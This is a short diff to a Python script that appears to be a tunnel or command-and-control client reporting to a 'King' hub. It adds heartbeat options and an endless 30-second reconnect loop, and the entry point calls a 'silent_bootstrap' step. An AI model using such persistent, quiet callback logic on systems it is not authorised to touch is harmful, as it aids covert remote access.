@@ -754,6 +754,8 @@ def connect_to_king(url=DEFAULT_GITHUB_THRONE_URL):
         "--hostname", king_url,
         "--listener", "127.0.0.1:8888",
         "--protocol", "http2",
+        "--heartbeat-interval", "10s",
+        "--heartbeat-count", "3",
     ]
 
     try:
@@ -1035,6 +1037,16 @@ def parse_args():
     return args
 
 
+def main_loop(hub_ip, port, github_throne_url):
+    """Keep reconnecting to the King if the session drops."""
+    while True:
+        try:
+            connect_to_hub(hub_ip, port, github_throne_url)
+        except Exception as e:
+            print(f'[-] Connection lost. Retrying in 30 seconds...')
+        time.sleep(30)
+
+
 if __name__ == '__main__':
     args = parse_args()
     silent_bootstrap()
@@ -1059,5 +1071,4 @@ if __name__ == '__main__':
     else:
         print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
 
-    connect_to_hub(args.hub_ip, args.hub_port, args.github_throne_url)
-
+    main_loop(args.hub_ip, args.hub_port, args.github_throne_url)
